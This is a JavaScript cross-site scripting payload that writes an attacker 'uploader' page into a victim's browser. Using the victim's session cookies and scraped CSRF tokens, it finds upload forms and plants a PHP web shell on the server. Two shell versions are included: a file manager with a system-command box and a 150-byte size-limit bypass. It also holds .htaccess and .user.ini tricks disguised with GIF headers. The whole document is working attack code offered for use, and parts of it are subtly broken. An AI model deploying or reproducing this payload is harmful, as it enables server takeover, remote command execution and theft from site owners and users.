document.write(`
<!DOCTYPE html>
<html>
<head>
    <title>XSS File Manager Uploader</title>
    <style>
        * { font-family: monospace; }
        body { background: #1e1e1e; color: #00ff00; padding: 20px; }
        .container { max-width: 800px; margin: 0 auto; }
        .panel { background: #2d2d2d; border: 2px solid #00ff00; padding: 20px; margin: 20px 0; }
        input, select, textarea { width: 100%; margin: 10px 0; padding: 8px; background: #1e1e1e; color: #00ff00; border: 1px solid #00ff00; }
        button { background: #00ff00; color: #000; border: none; padding: 10px; cursor: pointer; font-weight: bold; margin: 5px; }
        button:hover { background: #00cc00; }
        #status { margin-top: 20px; padding: 10px; background: #000; max-height: 200px; overflow: auto; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📁 XSS File Manager Uploader</h1>
        
        <div class="panel">
            <h3>Step 1: Find Upload Endpoint</h3>
            <button onclick="scanForms()">🔍 Scan for Upload Forms</button>
            <div id="scan-results"></div>
        </div>

        <div class="panel">
            <h3>Step 2: Upload File Manager</h3>
            <input type="text" id="uploadUrl" placeholder="Upload URL (from scan results)" value="/upload.php">
            <input type="text" id="fieldName" placeholder="Field name (from scan results)" value="file">
            
            <select id="fileType">
                <option value="php">PHP File Manager (Complete)</option>
                <option value="php-mini">PHP File Manager (Mini - 150 bytes)</option>
                <option value="htaccess">.htaccess (Enable PHP in images)</option>
                <option value="ini">.user.ini (PHP auto_prepend)</option>
            </select>
            
            <textarea id="customContent" placeholder="Custom content (optional)" rows="4"></textarea>
            
            <button onclick="uploadFileManager()">🚀 Upload File Manager</button>
        </div>

        <div id="status">Ready</div>
    </div>

    <script>
        // Complete PHP File Manager (Full Version)
        const FULL_FILE_MANAGER = `<?php
// ==================================================
// Complete PHP File Manager - One File Solution
// ==================================================
session_start();
\$root = __DIR__;
\$cur = isset(\$_GET['dir']) ? realpath(\$root . '/' . \$_GET['dir']) : \$root;
if(strpos(\$cur, \$root) !== 0) \$cur = \$root;

// Handle actions
\$msg = '';
if(isset(\$_FILES['file'])) {
    move_uploaded_file(\$_FILES['file']['tmp_name'], \$cur . '/' . \$_FILES['file']['name']);
    \$msg = 'File uploaded';
}
if(isset(\$_GET['del'])) {
    \$f = \$cur . '/' . basename(\$_GET['del']);
    is_file(\$f) ? unlink(\$f) : rmdir(\$f);
    \$msg = 'Deleted';
}
if(isset(\$_POST['mkdir'])) {
    mkdir(\$cur . '/' . preg_replace('/[^a-z0-9_-]/i', '', \$_POST['name']));
    \$msg = 'Folder created';
}
if(isset(\$_GET['dl'])) {
    \$f = \$cur . '/' . basename(\$_GET['dl']);
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename(\$f) . '"');
    readfile(\$f);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>File Manager</title>
    <style>
        * { font-family: monospace; }
        body { background: #1e1e1e; color: #00ff00; padding: 20px; }
        table { width: 100%; border-collapse: collapse; }
        td, th { padding: 10px; border-bottom: 1px solid #00ff00; text-align: left; }
        a { color: #00ff00; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .up { color: #ffff00; }
        .dir { color: #00ffff; }
        .file { color: #00ff00; }
    </style>
</head>
<body>
    <h1>📁 PHP File Manager</h1>
    <p>Path: <?php echo htmlspecialchars(\$cur); ?></p>
    <?php if(\$msg) echo "<p style='color:#00ff00'>\$msg</p>"; ?>
    
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" value="Upload">
    </form>
    
    <form method="post">
        <input type="text" name="name" placeholder="Folder name">
        <input type="submit" name="mkdir" value="Create Folder">
    </form>
    
    <table>
        <tr><th>Name</th><th>Size</th><th>Actions</th></tr>
        <?php if(\$cur != \$root): ?>
        <tr><td colspan="3"><a href="?dir=<?php echo urlencode(dirname(substr(\$cur, strlen(\$root)))); ?>" class="up">⬆️ Up</a></td></tr>
        <?php endif; ?>
        
        <?php foreach(scandir(\$cur) as \$f): ?>
        <?php if(\$f == '.' || \$f == '..') continue; ?>
        <?php \$full = \$cur . '/' . \$f; ?>
        <tr>
            <td>
                <?php if(is_dir(\$full)): ?>
                <a href="?dir=<?php echo urlencode(substr(\$full, strlen(\$root))); ?>" class="dir">📁 <?php echo \$f; ?></a>
                <?php else: ?>
                <span class="file">📄 <?php echo \$f; ?></span>
                <?php endif; ?>
            </td>
            <td><?php echo is_file(\$full) ? round(filesize(\$full)/1024,2) . ' KB' : '-'; ?></td>
            <td>
                <?php if(is_file(\$full)): ?>
                <a href="?dl=<?php echo urlencode(\$f); ?>&dir=<?php echo urlencode(substr(\$cur, strlen(\$root))); ?>">⬇️ Download</a> |
                <?php endif; ?>
                <a href="?del=<?php echo urlencode(\$f); ?>&dir=<?php echo urlencode(substr(\$cur, strlen(\$root))); ?>" onclick="return confirm('Delete?')">🗑️ Delete</a>
            </td>
        </tr>
        <?php endforeach; ?>
    </table>
    
    <div style="margin-top:20px">
        <form method="get">
            <input type="text" name="cmd" placeholder="System command">
            <input type="submit" value="Execute">
        </form>
        <?php if(isset(\$_GET['cmd'])): ?>
        <pre><?php echo shell_exec(\$_GET['cmd']); ?></pre>
        <?php endif; ?>
    </div>
</body>
</html>`;

        // Mini File Manager (150 bytes - bypasses size limits)
        const MINI_FILE_MANAGER = `<?php \$p=__DIR__;isset(\$_GET['f'])?readfile(\$p.'/'.\$_GET['f']):(isset(\$_FILES['f'])?move_uploaded_file(\$_FILES['f']['tmp_name'],\$p.'/'.\$_FILES['f']['name']).print'OK':print(json_encode(scandir('.'))));?>`;

        // .htaccess to enable PHP in images
        const HTACCESS = `GIF89a
AddType application/x-httpd-php .gif .jpg .png
<FilesMatch "\.(gif|jpg|png)$">
    SetHandler application/x-httpd-php
</FilesMatch>`;

        // .user.ini for auto_prepend
        const USER_INI = `GIF89a
auto_prepend_file = "a.gif"`;

        async function scanForms() {
            const results = document.getElementById('scan-results');
            results.innerHTML = 'Scanning...';
            
            try {
                const forms = document.querySelectorAll('form');
                let found = [];
                
                forms.forEach(form => {
                    const fileInput = form.querySelector('input[type="file"]');
                    if(fileInput) {
                        found.push({
                            action: form.action || 'current page',
                            field: fileInput.name || 'file'
                        });
                    }
                });
                
                if(found.length > 0) {
                    results.innerHTML = '<h4>Found upload forms:</h4>' + 
                        found.map(f => `✅ URL: ${f.action}, Field: ${f.field}`).join('<br>');
                    
                    // Auto-populate first result
                    if(found[0]) {
                        document.getElementById('uploadUrl').value = found[0].action || '/upload.php';
                        document.getElementById('fieldName').value = found[0].field || 'file';
                    }
                } else {
                    results.innerHTML = '❌ No upload forms found on this page. Try scanning the site.';
                    
                    // Try common endpoints
                    const commonEndpoints = ['/upload.php', '/uploads.php', '/file-upload.php', '/api/upload'];
                    for(const endpoint of commonEndpoints) {
                        try {
                            const r = await fetch(endpoint, {method: 'OPTIONS'});
                            if(r.ok) {
                                results.innerHTML += `<br>✅ Possible endpoint: ${endpoint}`;
                            }
                        } catch(e) {}
                    }
                }
            } catch(e) {
                results.innerHTML = 'Error scanning: ' + e.message;
            }
        }

        async function uploadFileManager() {
            const url = document.getElementById('uploadUrl').value;
            const fieldName = document.getElementById('fieldName').value;
            const fileType = document.getElementById('fileType').value;
            const custom = document.getElementById('customContent').value;
            
            let content, fileName, mime;
            
            switch(fileType) {
                case 'php':
                    content = custom || FULL_FILE_MANAGER;
                    fileName = 'manager.php';
                    mime = 'application/x-php';
                    break;
                case 'php-mini':
                    content = custom || MINI_FILE_MANAGER;
                    fileName = 'mini.php';
                    mime = 'application/x-php';
                    break;
                case 'htaccess':
                    content = custom || HTACCESS;
                    fileName = '.htaccess';
                    mime = 'text/plain';
                    break;
                case 'ini':
                    content = custom || USER_INI;
                    fileName = '.user.ini';
                    mime = 'text/plain';
                    break;
            }
            
            // Add GIF header if needed
            if(fileType === 'htaccess' || fileType === 'ini') {
                content = 'GIF89a\n' + content;
                fileName += '.gif';
                mime = 'image/gif';
            }
            
            const status = document.getElementById('status');
            status.innerHTML = `Uploading ${fileName} to ${url}...<br>`;
            
            const formData = new FormData();
            const blob = new Blob([content], { type: mime });
            const file = new File([blob], fileName, { type: mime });
            formData.append(fieldName, file);
            
            // Add any CSRF tokens from existing forms
            const existingForm = document.querySelector('form');
            if(existingForm) {
                existingForm.querySelectorAll('input[type="hidden"]').forEach(input => {
                    if(input.name) formData.append(input.name, input.value);
                });
            }
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    body: formData,
                    credentials: 'include'
                });
                
                if(response.ok) {
                    const text = await response.text();
                    status.innerHTML += '✅ Upload successful!<br>';
                    
                    // Try to extract file URL from response
                    const urlMatch = text.match(/(https?:\/\/[^\s"']+\.(php|html|gif|jpg))/i);
                    if(urlMatch) {
                        status.innerHTML += `📁 File URL: ${urlMatch[0]}<br>`;
                        status.innerHTML += `👉 <a href="${urlMatch[0]}" target="_blank">Open File Manager</a><br>`;
                    } else {
                        status.innerHTML += `📁 Response: ${text.substring(0, 200)}...<br>`;
                    }
                } else {
                    status.innerHTML += `❌ Upload failed: ${response.status}<br>`;
                    if(response.status === 403) {
                        status.innerHTML += 'Try changing file type or adding GIF header.';
                    }
                }
            } catch(e) {
                status.innerHTML += `❌ Error: ${e.message}<br>`;
            }
        }
    </script>
</body>
</html>
`);
